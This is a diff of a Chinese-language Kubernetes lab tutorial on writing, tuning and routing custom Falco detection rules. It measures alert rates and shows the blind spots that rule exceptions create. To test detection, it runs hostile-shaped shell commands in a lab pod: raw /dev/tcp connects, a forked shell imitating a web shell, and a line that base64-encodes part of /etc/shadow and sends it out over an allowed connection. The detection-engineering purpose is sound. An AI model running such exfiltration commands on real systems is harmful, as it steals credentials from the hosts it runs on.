+          --since="$((SECS + 30))s" --prefix=false 2>/dev/null | grep '"rule"' || true)
+IN=$(echo "$LINES" | awk -v s="$START" -v e="$END" \
+      'match($0,/"time":"[^"]*"/){t=substr($0,RSTART+8,RLENGTH-9); if(t>=s&&t<=e) print}')
+N=$(echo "$IN" | grep -c . || true)
+echo "--- $N alert(s) in ${SECS}s = $(echo "scale=1; $N*60/$SECS" | bc) alerts/min"
+echo "$IN" | sed -n 's/.*"rule":"\([^"]*\)".*/\1/p' | sort | uniq -c | sort -rn
+EOF
+chmod +x alert-rate.sh
+```
+
+
+一顆每 2 秒發一次請求的 pod，每分鐘是 30 次請求。量兩分鐘：
+
+```console
+$ ./alert-rate.sh 120
+window start 2026-08-06T11:10:51Z, 120s
+window end   2026-08-06T11:12:51Z
+--- 360 alert(s) in 120s = 180.0 alerts/min
+   360  Unexpected outbound connection from lab workload
+```
+
+
+每分鐘 180 筆，是請求數的六倍。
+
+### 180 筆從哪裡來 {#where-180-comes-from}
+
+<span id="mine-4"></span>
+
+把這兩分鐘的告警依對端分組，每一列是筆數和（對端 IP、port、協定、行程）：
+
+```console
+150  ('10.0.0.10', 53, 'udp', 'python')     ← CoreDNS
+ 30  ('10.0.47.134', 8080, 'tcp', 'python') ← 目標 Service 的 ClusterIP
+```
+
+
+連到接收端 ClusterIP（Service 在叢集內的虛擬 IP）的 TCP 是 30 筆，一次請求一條，跟預期一樣。多出來的 150 筆都連到 CoreDNS（叢集的 DNS 伺服器，`10.0.0.10`）的 UDP 53，平均每次請求 5 筆。
+
+原因在 Kubernetes 替每個 pod 寫的 `/etc/resolv.conf`。它的格式大致如下（依 Kubernetes 官方文件的格式；本課沒有在 pod 裡實際印出這個檔案，你的 `search` 清單可能多幾個網域，用 `kubectl exec` 進 pod `cat /etc/resolv.conf` 就看得到自己的版本）：
+
+```text
+search <ns>.svc.cluster.local svc.cluster.local cluster.local
+options ndots:5
+```
+
+
+`search` 是一份網域清單：要查的名字如果不夠「完整」，解析器會先把清單裡的網域依序接在名字後面去查。`ndots:5` 定義了什麼叫不夠完整：名字裡的點少於 5 個。`webhook-receiver.falco.svc.cluster.local` 只有 4 個點，所以解析器先把 search 清單裡的網域逐一接上去查，都查不到，最後才查原本的名字。
+
+照著順序畫出來，由上往下是時間順序：
+
+![legit-client 發出一次請求後，解析器依序查詢接上各個 search 網域的名字（都查不到），最後查原名才拿到 10.0.47.134，每次查詢都送到 CoreDNS 10.0.0.10 的 UDP 53，最後才建立一條到 10.0.47.134:8080 的 TCP 連線](../assets/diagrams/s2d4-dns-search.svg)
+
+照著圖由上往下看：應用程式只發了一次請求，解析器卻對 CoreDNS 查了好幾個名字。每查一個名字都會開一個 UDP socket 並呼叫 `connect()`；UDP 的 `connect()` 一樣是 `connect` 系統呼叫，規則 A 看的就是它，所以每一次都算一筆。實測每次請求是 5 次 `connect()`，每一次各對應哪一個名字，本課沒有逐筆拆開確認。
+
+這個倍數由叢集的 DNS 設定決定，跟應用程式怎麼寫無關：同一支程式換一個 namespace、連一個名字長度不同的 Service，倍數就會變。在 Kubernetes 上估計一條網路規則會報多少，要先把 DNS 查詢算進去。
+
+## 步驟 5：在有誤報的環境裡測試命中
+
+legit-client 繼續跑著。現在做 Day 3 那兩個預設規則沒報的動作。
+
+### 規則 A：連 8.8.8.8
+
+```console
+$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c 'exec 3<>/dev/tcp/8.8.8.8/53 && echo connect-ok'
+connect-ok
+```
+
+
+Falco 對這個動作輸出的告警（節錄）：
+
+```json
+{
+  "rule": "Unexpected outbound connection from lab workload",
+  "priority": "Warning",
+  "hostname": "<node-a>",
+  "tags": ["T1071","custom","mitre_command_and_control","network","sprint2_day4"],
+  "output_fields": {
+    "fd.sip": "8.8.8.8", "fd.sport": 53, "fd.l4proto": "tcp",
+    "proc.name": "bash",
+    "proc.cmdline": "bash -c exec 3<>/dev/tcp/8.8.8.8/53 && echo connect-ok",
+    "container.id": "41ae0eb6f163", "container.name": "nginx",
+    "k8s.pod.name": "baseline-nginx", "k8s.ns.name": "ebpf-lab"
+  }
+}
+```
+
+
+這就是 Day 3 零告警的那個動作。Day 2 的手工基線只能告訴你「連線清單多了一個沒見過的位址」；現在它是一筆有名字的 Warning，帶著對端、指令、pod 名稱和 T1071 的分類。
+
+### 規則 B：用 `&` fork 出第二層 shell
+
+驗證規則 B，要讓容器裡的 shell 真的再生一個 shell。Day 3 試過巢狀的 `bash -c '<單一指令>'`，結果會誤導：`-c` 後面只有一個指令時，bash 會直接 exec 那個指令，用它取代自己（implicit exec），內層 shell 換掉了外層，父行程還是容器執行期。要真的 fork 出子行程，得在內層指令後面加 `&`。外面包 `script -q /dev/null` 是為了配到終端機，跟 Day 3 的作法一樣：
+
+```console
+$ script -q /dev/null kubectl -n ebpf-lab exec -it baseline-nginx -- \
+      bash -c 'bash -c "echo forked-shell-ran" & wait; echo done'
+forked-shell-ran
+done
+```
+
+
+這一次動作有兩次 `bash` 的 `execve`，兩條規則各報一筆：
+
+| 規則 | `proc.name` | `proc.pname` | `proc.tty` |
+|---|---|---|---|
+| `Terminal shell in container`（預設） | bash | **containerd-shim** | 34816 |
+| `Shell spawned by non-runtime parent in container`（自訂） | bash | **bash** | 34816 |
+
+預設規則抓到第一層，它的父行程是 containerd-shim；規則 B 抓到 fork 出來的第二層，它的父行程是 bash。Day 3 那次「2 次 `execve` 只有 1 筆告警」，現在兩次都有告警了。
+
+### 沒有終端機的 web shell
+
+上面那次包了 `script`，fork 出來的 shell 繼承了終端機，所以 `proc.tty` 是 34816。web shell 是網站程式在背景開的，沒有終端機。把 `script` 和 `-it` 拿掉再做一次。下面的輸出把 `falco-alerts.sh` 撈到的 JSON 整理成一行一筆，只列跟 shell 有關的規則：
+
+```console
+$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c 'bash -c "echo webshell-no-tty" & wait; echo done'
+webshell-no-tty
+done
+
+$ ./falco-alerts.sh --since 15s
+Shell spawned by non-runtime parent in container   proc=bash pname=bash tty=0   cmd=bash -c echo webshell-no-tty
+--- 預設規則: 0 筆 ---
+```
+
+
+這次預設規則一筆都沒報：第一層沒有終端機，`proc.tty != 0` 不成立；第二層的父行程是 bash，不符合 `container_entrypoint`。腳本化、沒有終端機的入侵，預設的 shell 規則完全看不到。規則 B 報了，而且 `tty=0` 可以用來分辨它跟真人用 `kubectl exec -it` 開的 shell。
+
+同一段時間，規則 A 還在替 legit-client 報誤報：這次測試前後 12 秒內有 36 筆。真正的 web shell 告警只有一筆，夾在這 36 筆中間。這些告警如果全部送進值班頻道，那一筆很容易被漏看。
+
+## 步驟 6：用 `exceptions` 調校，並找出例外放行了什麼
+
+### 寫兩條例外
+
+誤報來自兩個對端：CoreDNS 的 UDP 53，以及接收端 Service 的 TCP 8080。Falco 規則有一個 `exceptions` 欄位，專門寫例外：每條例外有一個名字，`fields` 列出要比對的欄位，`comps` 是比對方式，`values` 是要放行的值。Falco 載入規則時，會把每條例外轉成一段 `and not (...)`，接在 `condition` 後面。
+
+在 `custom-rules.yaml` 裡規則 A（`- rule: Unexpected outbound connection from lab workload`）的最後，`tags` 那一行下面，加上 `exceptions` 這一段。下面的片段省略了規則 A 原本的欄位，只是標出位置：
+
+```yaml
+- rule: Unexpected outbound connection from lab workload
+  # …condition / output / priority 不變…
+  exceptions:
+    - name: cluster_dns_resolution
+      fields: [fd.sip, fd.sport, fd.l4proto]
+      comps: [=, =, =]
+      values:
+        - ["10.0.0.10", 53, udp]
+    - name: known_internal_services
+      fields: [fd.sip, fd.sport, fd.l4proto]
+      comps: [=, =, =]
+      values:
+        - ["10.0.47.134", 8080, tcp]
+```
+
+
+`10.0.0.10` 和 `10.0.47.134` 是本課叢集的值，照抄不會有作用，要換成你叢集裡的值：CoreDNS 是 `kube-system` namespace 的 `kube-dns` Service，接收端是 `falco` namespace 的 `webhook-receiver` Service，兩個都用 `kubectl get svc -n <namespace>` 的 `CLUSTER-IP` 欄查。步驟 4 依對端分組的結果裡，也看得到這兩個 IP。
+
+效果跟直接在 `condition` 尾巴接 `and not (fd.sip = "10.0.0.10" and …)` 一樣，差別在日後的維護：
+
+| | 塞進 `condition` | 用 `exceptions` |
+|---|---|---|
+| **有名字** | 沒有。半年後看到 `and not (fd.sip="10.0.0.10" …)`，沒人知道為什麼加、誰加的 | `name: cluster_dns_resolution` 就說明了理由，稽核時可以逐條問「這條還需要嗎」 |
+| **可追加** | 新增一個豁免對端，必須改原檔裡那條布林運算式 | 可以在另一個檔案裡只追加 `values`，原規則檔一個字不動 |
+| **好審查** | diff 是「一行超長條件變成另一行更長的條件」 | diff 是「某條具名例外多了一列 values」，一眼看得出放行範圍擴大了多少 |
+| **有結構** | 純文字 | `fields`／`comps`／`values` 有固定結構，可以用程式檢查，例如禁止任何例外拿整段 CIDR 當值 |
+
+「可追加」靠的是 Falco 的覆寫語法：在後解析的檔案裡寫一條同名的規則，就能改動先解析的那條。同名規則只寫 `- rule: <同名>` 加完整欄位，會整條取代；只想加一點東西，就在同名規則底下寫 `override`，指定某個欄位要 `append`（接在原本的後面）或 `replace`（取代）。`append` 是直接把文字接在原本的 `condition` 後面，所以要自己寫 `and`，例如 `condition: and not user.name=root`；用在 `exceptions` 上，新的 `values` 會併入既有的例外。想關掉一條規則，就寫同名規則加 `enabled: false`。
+
+所以多個團隊共用一座叢集時，可以由一個團隊維護規則本身，各應用團隊在自己的檔案裡只追加自己的例外值。本課沒有實際跑過追加的寫法；要用的話，照[官方的覆寫說明](https://falco.org/docs/concepts/rules/overriding/)寫，套用後一樣用步驟 3 的啟動日誌確認沒有 warning。
+
+例外也不一定要逐一列 IP：`comps` 可以用 `in`，配合 `fd.snet` 這類欄位一次放行整個網段。這樣寫起來省事，放行的範圍也跟著變大。
+
+改好 `custom-rules.yaml`，重跑步驟 3 的 `helm upgrade` 指令。這次只有規則內容變了，DaemonSet 還是會整個滾動一遍（[疑難排解：只改規則內容，整個 DaemonSet 也重啟一遍](#mine-1)）。
+
+### 調校後的告警率
+
+legit-client 一直在跑，流量跟之前一樣。再量一次：
+
+```console
+$ ./alert-rate.sh 120
+window start 2026-08-06T11:16:11Z, 120s
+window end   2026-08-06T11:18:11Z
+--- 0 alert(s) in 120s = 0.0 alerts/min
+```
+
+
+真正的偏離照樣報。重做步驟 5 的動作，對照調校前後：
+
+| | 調校前 | 調校後 |
+|---|---|---|
+| `legit-client` 正常流量 | **180.0 alerts/min** | **0.0 alerts/min** |
+| 連 8.8.8.8:53 | 命中 | **命中** |
+| fork 出來的 shell（規則 B） | 命中 | **命中** |
+
+這個 0 是 120 秒窗口的結果，本課沒有做更長時間的觀察。
+
+### 這兩條例外放行了什麼 {#what-exceptions-allow}
+
+<span id="mine-5"></span>
+
+誤報歸零、真正的偏離照樣報，看起來沒有代價。可是例外只比對 IP、port 和協定，不管是誰連的、送了什麼。從 `baseline-nginx` 對這兩個被放行的對端，做兩件帶惡意的事：
+
+```console
+$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c '
+    exec 3<>/dev/udp/10.0.0.10/53 && echo "dns-tunnel-socket-ok"
+    exec 4<>/dev/tcp/10.0.47.134/8080 &&
+      printf "GET /?leak=$(head -c 24 /etc/shadow | base64 -w0) HTTP/1.0\r\n\r\n" >&4 &&
+      head -1 <&4'
+dns-tunnel-socket-ok
+HTTP/1.0 200 OK
+
+$ ./falco-alerts.sh --since 20s --rules
+--- Unexpected outbound connection from lab workload: 0 筆 ---
+```
+
+
+第一行對 CoreDNS 開一個 UDP socket，這是 DNS tunnelling 的第一步。DNS tunnelling 把資料編碼在查詢的網域名稱裡送出去；CoreDNS 預設會替叢集外的名字往上游查詢，所以這條路可以通到叢集外。第二段把 `/etc/shadow` 的前 24 個位元組做 base64，塞進查詢字串，送給被放行的接收端 Service。最後一行是 `falco-alerts.sh` 撈到的結果，整理成只看規則 A：兩件事都是 0 筆。
+
+把這兩件事和前面的連線並排，對上兩條例外：
+
+![五個連線動作與規則 A 的結果：legit-client 查 DNS 與 GET /ping、baseline-nginx 開 DNS socket 與把 /etc/shadow 塞進 GET，這四個連到的都是例外放行的 IP、port、協定，規則 A 都不報；只有連 8.8.8.8:53 的那一列會報](../assets/diagrams/s2d4-exception-holes.svg)
+
+對照第 3、4 列和第 1、2 列：連的是同樣的 IP、port、協定，例外分不出差別，所以一樣放行。
+
+這一次，其他預設規則有報：
+
+```text
+Warning  Read sensitive file untrusted                            proc=head  file=/etc/shadow
+Notice   Redirect STDOUT/STDIN to Network Connection in Container  proc=bash  fd.sip=10.0.47.134
+```
+
+
+那是因為這次剛好讀了 `/etc/shadow`，又剛好把檔案描述子（fd）重導到網路 socket。換一個情況：一支本來就連著資料庫的應用被植入程式碼，把查到的資料經由被放行的對端送出去。它沒有讀敏感檔案、沒有重導 fd，規則 A 又放行，這三條規則都不會報。
+
+所以調校一條規則時，每加一條例外，被放行的對端就不再受這條規則檢查；例外放得越寬，規則能看到的範圍就越小。要做的是把讓出去的部分寫清楚：每條例外放行了哪個 IP、port、協定，從那裡可能送出什麼，寫進例外的名字或旁邊的註解，並定期回頭檢查還需不需要。
+
+例外裡的 IP 是寫死的，也要一起檢查。這一章最後會刪掉接收端，`known_internal_services` 這條例外指向的 ClusterIP 就沒有 Service 在用了。之後新建的 Service 可能被分配到同一個 ClusterIP，那時這條例外放行的就是那個新服務的 8080，而它從來沒有被審查過。
+
+## 步驟 7：看接收端收到了什麼
+
+步驟 3 打開 sidekick 之後，所有 notice 以上的告警都送到了接收端，包括調校前的誤報。先數接收端收到幾筆：
 
 ```console
 $ kubectl -n falco logs deploy/webhook-receiver | grep -c RECEIVED
 964
 ```
 
-一筆規則 A 的告警,逐字是接收端印出來的:
+
+其中一筆規則 A 的告警，是接收端印出來的原文：
 
 ```json
 {
@@ -497,91 +635,75 @@ $ kubectl -n falco logs deploy/webhook-receiver | grep -c RECEIVED
 }
 ```
 
-三段路徑各有各的證據,而且**最後一段刻意不採信 Falco 或 sidekick 的說法**——否則證明的只是「有東西被送出去」,不是「東西送達了」:
+
+告警路徑的三段，分別對應步驟 3 圖上的證據 1、2、3：
 
 | 段 | 證據 |
 |---|---|
-| Falco → sidekick | sidekick 日誌的 `[DEBUG] : Falco's payload : {…}` |
-| sidekick → 接收端 | sidekick 日誌的 `[INFO] : Webhook - POST OK (200)` |
-| **接收端真的拿到了** | **接收端自己的標準輸出 `RECEIVED {…}`,964 次** |
+| 1. Falco → sidekick | sidekick 日誌的 `[DEBUG] : Falco's payload : {…}` |
+| 2. sidekick → 接收端 | sidekick 日誌的 `[INFO] : Webhook - POST OK (200)` |
+| **3. 接收端真的拿到了** | **接收端自己的標準輸出 `RECEIVED {…}`，964 次** |
 
-### sidekick 多給了什麼、又要了什麼
+最後一段只看接收端自己的日誌。Falco 和 sidekick 的日誌能證明告警送出去了，要證明對方收到，得看接收端。
 
-**多給的:**
+### 964 筆裡有幾筆該看 {#how-many-to-read}
 
-- **`uuid`。** 對照 Falco 自己輸出的 JSON key(`hostname`、`output`、`output_fields`、`priority`、`rule`、`source`、`tags`、`time`)——**沒有 `uuid`**。sidekick 替每一筆事件生一個唯一 ID,這是下游做去重(同一事件送往多個目的地)與交叉引用(工單系統關聯回原始事件)的鉤子。
-- **扇出。** 一份輸入、數十個目的地各自獨立開關。Falco 本身的 `http_output` 只能有一個位址。
-- **依 priority 過濾。** 每個目的地各自的 `minimumpriority`,例如 webhook 收 notice 以上、呼叫器只收 critical。
+<span id="mine-7"></span>
 
-**要走的:**
+按規則分組：
 
-| 成本 | 實測 |
-|---|---|
-| 多的 pod | **2 顆**(chart 預設 `replicaCount: 2`,見[地雷 6](#mine-6)) |
-| 資源 | 每顆 1m CPU、13–20Mi,比 Falco 本體小一個數量級 |
-| 多一個要顧的元件 | sidekick 掛掉等於告警送不出去,而 **Falco 一切正常、DaemonSet 全綠** |
-| 多一段設定 | webhook 位址、priority 門檻,真實環境還有憑證 |
+```console
+   956  Unexpected outbound connection from lab workload
+     3  Shell spawned by non-runtime parent in container
+     2  Terminal shell in container
+     2  Redirect STDOUT/STDIN to Network Connection in Container
+     1  Read sensitive file untrusted
+```
 
-最後一列是重點:**sidekick 是 Deployment,不是 DaemonSet。** 它是整條告警鏈上唯一的集中點,也是唯一會讓「偵測正常但沒人知道」發生的地方。
 
-## 誠實的差距
+956 筆，也就是 99.2%，是規則 A 調校前的誤報；該看的 8 筆散在裡面。這一章是先接上路由、再調校，所以誤報全部送到了下游。實際上線時順序要反過來：先讓規則在 Falco 的標準輸出上安靜下來，再接上路由。標準輸出多幾百筆不會打擾任何人；送到下游，值班頻道會被大量訊息蓋過，呼叫器在半夜也會照樣發出通知，日誌平台也照寫入量計費。
 
-- **`minimumpriority` 設了但沒被驗證。** 實驗期間沒有產生 informational 或 debug 等級的事件,所以「低於門檻的會被擋掉」這件事沒有實測過。
-- **追加式覆寫沒有實作。** 上面那張表提到官方語法可以只追加 `exceptions` 的 `values` 而不動原規則檔,這是官方文件寫的能力,那條路徑沒有跑過。
-- **告警去向只驗到叢集內的 webhook。** 真實環境常見的 Slack、SIEM、物件儲存全部沒接——它們都需要憑證,不適合放進教材。扇出的能力是設定層的,這裡只證明了「一個目的地收得到」。
-- **調校後的規則沒有長時間觀察。** 0 alerts/min 是 120 秒窗口的結果,不是跑一週的結果。
-- **兩個 `exceptions` 寫死了 ClusterIP。** 其中一個指向的 Service 在收工時已經刪掉,那條例外從此指向一個不存在的位址——無害但無效。這本身就是「例外需要定期回頭審查」的實例。
+### sidekick 多做了什麼，又多了哪些成本
 
-## 驗收 checkpoint
+Falco 自己輸出的 JSON 只有 `hostname`、`output`、`output_fields`、`priority`、`rule`、`source`、`tags`、`time` 這幾個 key。接收端收到的多了一個 `uuid`，是 sidekick 替每一筆事件產生的唯一 ID：同一筆事件送到好幾個目的地時，下游可以靠它去除重複，工單系統也可以用它連回原始事件。sidekick 另外可以把一份輸入同時送到多個目的地、每個目的地各自設 `minimumpriority`（例如 webhook 收 notice 以上，呼叫器只收 critical），而 Falco 自己的 `http_output` 只能設一個位址。這兩項是 sidekick 的設定功能，本課只接了一個 webhook 目的地，沒有實測多個目的地，也沒有驗證門檻的過濾效果。
 
-| 驗證 | 判準 | 本課環境的結果 |
-|---|---|---|
-| 自訂規則載入 | 啟動日誌出現 `/etc/falco/rules.d/custom-rules.yaml \| schema validation: ok`,且**沒有 warning 區塊** | 修掉 `evt.dir` 之後成立 |
-| 規則 A 命中 | Day 3 零告警的那個動作(連 8.8.8.8:53)產生具名告警 | 命中,帶 `fd.sip`／`fd.sport` 與 pod 身分 |
-| 規則 B 命中 | `&` fork 出來的第二層 shell 產生告警,而預設規則對它靜默 | 兩者並排成立;無 tty 版本預設規則 0 筆、自訂規則 1 筆 |
-| **誤報調校前後** | 同一份流量,調校前後的 alerts/min 都量得出來 | **180.0 → 0.0**,同窗口長度 120 秒 |
-| 調校後不失能 | 真偏離仍然命中 | 規則 A、規則 B、預設 shell 規則三條全部照樣命中 |
-| 調校的代價 | 說得出被豁免之後具體多了哪些不會被抓的動作,而且實測 | 兩個 exfil 形狀的動作,規則 A **兩次都是 0 筆** |
-| **送達** | 接收端自己的日誌裡有 payload | `RECEIVED` 964 次,含 sidekick 加上的 `uuid` |
+成本方面，sidekick 多了 2 顆 pod（chart 預設 `replicaCount: 2`，見[疑難排解](#mine-6)），每顆實測約 1m CPU、13–20Mi，比 Falco 本身小一個數量級；設定多了 webhook 位址和 priority 門檻，實際環境還要放憑證。比較需要注意的是它多了一個要顧的元件：sidekick 停了，告警就送不出去，而 **Falco 一切正常、DaemonSet 全部 Ready**。這就是步驟 3 圖上的第二點：sidekick 是整條告警路徑上唯一的集中點，偵測到了卻沒人收到的情況，只會發生在這裡。
 
-## 地雷記錄
+## 收工
 
-### 地雷 1:規則改一個字,全叢集的 Falco 滾一遍,而滾動期間節點沒有監控 {#mine-1}
+接收端和 legit-client 只用在這一章。先把 `falco-values.yaml` 裡的 `falcosidekick.enabled` 改回 `false`，照步驟 3 的指令再 `helm upgrade` 一次，關掉 sidekick；然後刪掉兩個測試用的物件：
 
-**症狀**:只改了規則檔的內容,整個 DaemonSet 卻滾動更新了一遍。
+```console
+$ kubectl delete -f legit-client.yaml
+$ kubectl delete -f webhook-receiver.yaml
+```
 
-**根因**:Falco 本身支援監看規則檔並熱重載,但 chart 的 pod template 上有一個 annotation:
+Falco 和調校後的兩條規則留在叢集上。Day 5 拿 Tetragon 對照時，Falco 這邊是「預設 25 條加這兩條自訂規則」。
+
+## 疑難排解
+
+### 只改規則內容，整個 DaemonSet 也重啟一遍 {#mine-1}
+
+**症狀**：只改了規則檔（例如加一條例外），`helm upgrade` 之後每個節點上的 Falco pod 都重建了一次。
+
+**原因**：Falco 本身會監看規則檔，改了就重新載入，但 chart 的 pod template 上有一個 annotation：
 
 ```text
 templates/pod-template.tpl:
     checksum/rules: {{ include (print $.Template.BasePath "/rules-configmap.yaml") . | sha256sum }}
 ```
 
-內容是 rules ConfigMap 的 sha256。改一個字元,checksum 就變,pod spec 就變,**整個 DaemonSet 滾動更新**。
 
-實測兩次 `helm upgrade`:
+它的值是規則 ConfigMap 的 sha256。規則改一個字元，checksum 就變，pod spec 跟著變，DaemonSet 就滾動更新。滾動預設一次換一個節點（`maxUnavailable: 1`），三個節點的叢集上，只改規則內容的那次升級花了 71 秒。每個節點輪到自己時，從舊 pod 停掉到新 pod 開始比對事件之間，沒有任何 syscall 監控。這段空檔的長短可以參考 Day 3 的[「從安裝到第一筆告警」](sprint2-day3-falco-basics.md)：從 `helm install` 起算，到 Falco 掛上 probe、開始比對事件，量到的是 26 秒。整個滾動期間，`kubectl get ds falco` 一直顯示健康。節點越多，滾完一輪越久，一百個節點的叢集改一條例外，就要滾數十分鐘。
 
-| 內容 | 牆鐘時間 |
-|---|---|
-| 加入 customRules 與 Falcosidekick | 67 秒 |
-| **只改規則內容**(加 `exceptions`、拿掉 `evt.dir`) | **71 秒** |
+**修法**：兩種做法，各有代價：
 
-滾動的形狀是一次一顆(DaemonSet 預設 `maxUnavailable: 1`),實測三顆節點上 falco 容器的啟動時刻間隔 24 秒與 21 秒。加上 [Day 3 量到的「容器起來到掛上 probe 要 26 秒」](sprint2-day3-falco-basics.md),每顆節點在自己那一輪裡有**數十秒完全沒有 syscall 監控**,而這期間 `kubectl get ds falco` 一路顯示健康。
+- **直接 patch ConfigMap，不經過 helm**：Falco 監看到檔案變了會重新載入，pod 不重啟；但 Helm release 記錄的狀態跟叢集實際狀態就對不上了，下一次 `helm upgrade` 會把改動蓋掉。
+- **接受滾動**：把規則變更當成一次部署來排時間，不要在處理事故的途中改規則。
 
-三顆節點是 71 秒。**一座 100 節點的叢集,改一個例外的值,就是一場長達數十分鐘、逐節點開洞的滾動更新。**
+### `evt.dir` 已經淘汰，規則照樣「載入成功」 {#mine-2}
 
-**修法**只有兩條路,兩條都有代價:
-
-- **直接 patch ConfigMap**(不走 helm):Falco 的檔案監看會熱重載、pod 不重啟,但 Helm release 的狀態跟叢集實際狀態就對不上了,下一次 `helm upgrade` 會把改動蓋掉。
-- **接受滾動**:把規則變更當成一次部署來排程,不要在事故處理中途改規則。
-
-**教訓**:**Falco 有熱重載能力,但打包方式把它拿掉了。** 只看 Falco 的文件會以為改規則是零成本的。
-
-### 地雷 2:`evt.dir` 已經淘汰,而規則照樣「載入成功」 {#mine-2}
-
-**症狀**:`helm upgrade` 回報 `STATUS: deployed`,pod 全綠,`schema validation: ok`——一切正常。
-
-規則第一版的 macro 是這樣寫的,這是各種教學文與舊版範例的標準寫法:
+**症狀**：`helm upgrade` 回報 `STATUS: deployed`，pod 全部 Running，日誌也寫著 `schema validation: ok`，可是規則可能永遠不會觸發。規則是照網路上的範例寫的，macro 長這樣，舊版 Falco 的教學與範例大多這樣寫：
 
 ```yaml
 - macro: lab_outbound_connect
@@ -591,7 +713,8 @@ templates/pod-template.tpl:
      and (evt.rawres >= 0 or evt.res = EINPROGRESS))
 ```
 
-**根因**在 Falco pod 的啟動日誌裡,而且只在那裡:
+
+**原因**：啟動日誌裡，規則檔那一行後面多了一段 warning：
 
 ```text
 /etc/falco/rules.d/custom-rules.yaml: Ok, with warnings
@@ -602,11 +725,10 @@ LOAD_DEPRECATED_ITEM (Used deprecated item: field 'evt.dir'):
   simplified by removing the condition on 'evt.dir'
 ```
 
-Falco 0.44 的 syscall source **不再送 enter 事件**,所以 `evt.dir = <` 恆真、`evt.dir = >` 恆假。
 
-這條規則剛好沒事——恆真等於把它拿掉。**但把不等號寫反的人不會這麼幸運**:`evt.dir = >` 會讓整條規則恆假、**永遠不會觸發,而且 helm 全綠、schema 驗證通過、pod 健康**。網路上大量 Falco 規則範例是 0.3x 時代寫的,複製過來就是這個結果。
+這一課用的是 Falco 0.44.1（chart 9.1.0 預設的版本）。Falco 0.44 的 syscall 事件來源不再送 enter 事件（系統呼叫進入時的事件），只留下返回時的事件，所以 `evt.dir = <` 永遠為真，`evt.dir = >` 永遠為假。寫 `<` 的規則剛好沒事，等於這個條件不存在；寫成 `>` 的規則永遠不會觸發，而 helm、schema 驗證、pod 狀態全部正常。網路上很多 Falco 規則範例是 0.3x 版的寫法，複製過來就會遇到。
 
-**修法**:刪掉那個詞。修完之後 warning 區塊整個消失:
+**修法**：刪掉 `evt.dir` 那個條件（步驟 1 的規則 A 已經沒有它）。修好之後，warning 區塊整個消失：
 
 ```console
 Loading rules from:
@@ -615,91 +737,12 @@ Loading rules from:
 The chosen syscall buffer dimension is: …          ← 直接接下一行,沒有 warning 區塊
 ```
 
-**「沒有 warning 區塊」本身就是驗收條件**,而不是「helm 成功」。
 
-### 地雷 3:預設的 `outbound` macro 把私有網段排除掉了 {#mine-3}
+判斷規則有沒有正常載入，看的是規則檔那一行下面有沒有 warning 區塊，而不是 helm 有沒有成功。
 
-**症狀**:複用預設 macro 寫的網路規則,在 Kubernetes 上安靜得不合理。
+### sidekick 預設兩份副本、不給 resources，還會擠在同一顆節點 {#mine-6}
 
-**根因**:把它倒出來看:
-
-```console
-$ kubectl -n falco exec <falco-pod> -c falco -- grep -A9 '^- macro: outbound$' /etc/falco/falco_rules.yaml
-- macro: outbound
-  condition: >
-    ((evt.type = connect or …) and
-     (fd.typechar = 4 or fd.typechar = 6) and
-     (fd.ip != "0.0.0.0" and fd.net != "127.0.0.0/8"
-      and not fd.snet in (rfc_1918_addresses)) and        ← 這一行
-     (evt.rawres >= 0 or evt.res = EINPROGRESS))
-```
-
-**`not fd.snet in (rfc_1918_addresses)`:目的地是私有網段就不算 outbound。** 在 Kubernetes 上,這一行的意思是**所有 pod 對 pod、pod 對 Service、pod 對 CoreDNS 的流量全部不在視野裡**——因為 Pod CIDR 與 Service CIDR 都是 RFC1918。
-
-這件事在本章有直接的後果:複用 `outbound` 的話,步驟 4 那 180 alerts/min 的誤報**根本不會發生**,一個 `exceptions` 都不用寫。看起來是把規則寫對了,實際上是拿「攻擊者橫向移動到叢集內另一個 Service」這整類行為換掉了誤報。
-
-**修法**:今天的 `lab_outbound_connect` 是自己拼的,刻意**不含**那一行。
-
-**教訓**:**預設 macro 是為預設規則的威脅模型寫的,不是為你的威脅模型寫的。** 複用之前要把它展開讀完。這也是本章最像陷阱的一顆——因為它是**看起來免費的調校**。
-
-### 地雷 4:誤報的量跟應用程式的請求量不成比例 {#mine-4}
-
-**症狀**:一顆每 2 秒發一次請求的 pod(每分鐘 30 次),產生 **180 alerts/min**。六倍。
-
-**根因**:拆開看告警的對端:
-
-```console
-150  ('10.0.0.10', 53, 'udp', 'python')     ← CoreDNS
- 30  ('10.0.47.134', 8080, 'tcp', 'python') ← 目標 Service 的 ClusterIP
-```
-
-30 次 TCP 連線(一次請求一條,合理),但 **150 次 DNS 查詢——一次 HTTP 請求配 5 次 `connect()`**。原因是 Kubernetes 替每個 pod 寫的 `/etc/resolv.conf`:
-
-```text
-search <ns>.svc.cluster.local svc.cluster.local cluster.local
-options ndots:5
-```
-
-`webhook-receiver.falco.svc.cluster.local` 有 4 個點,**小於 `ndots:5`**,所以解析器先把三個 search domain 依序接上去試(那些必然失敗的名字),失敗才試原名;每個名字又各發 A 與 AAAA 兩次查詢。UDP socket 的 `connect()` 一樣是 `connect` syscall,一樣命中規則。
-
-**教訓**:寫規則時腦子裡的模型是「它每 2 秒連一次」,實際是六倍——**而且這個倍數是叢集的 DNS 設定決定的,不是應用程式決定的**。同一支程式換個 namespace、換個 Service 名字長度,倍數就變。**任何用「預估事件率」來評估規則可行性的做法,在 Kubernetes 上都要先把 DNS 放大算進去。**
-
-### 地雷 5:調校一定要付偵測力,把帳算出來 {#mine-5}
-
-**症狀**:誤報從 180 降到 0,真偏離照樣命中——看起來沒有代價。
-
-**根因**:被豁免的兩個對端,現在是兩條免費通道。實測——同樣從 `baseline-nginx`,做兩件明確帶惡意形狀的事:
-
-```console
-$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c '
-    exec 3<>/dev/udp/10.0.0.10/53 && echo "dns-tunnel-socket-ok"
-    exec 4<>/dev/tcp/10.0.47.134/8080 &&
-      printf "GET /?leak=$(head -c 24 /etc/shadow | base64 -w0) HTTP/1.0\r\n\r\n" >&4 &&
-      head -1 <&4'
-dns-tunnel-socket-ok
-HTTP/1.0 200 OK
-
-$ ./falco-alerts.sh --since 20s --rules
---- Unexpected outbound connection from lab workload: 0 筆 ---
-```
-
-**兩次都是零。** 具體交出去的是:
-
-1. **對 CoreDNS 的 UDP 53 完全開放。** DNS tunnelling(把資料編碼進查詢名稱送出去)是成熟的滲出手法,而 CoreDNS 預設會替叢集外的名字做遞迴解析——這條通道通到外網。
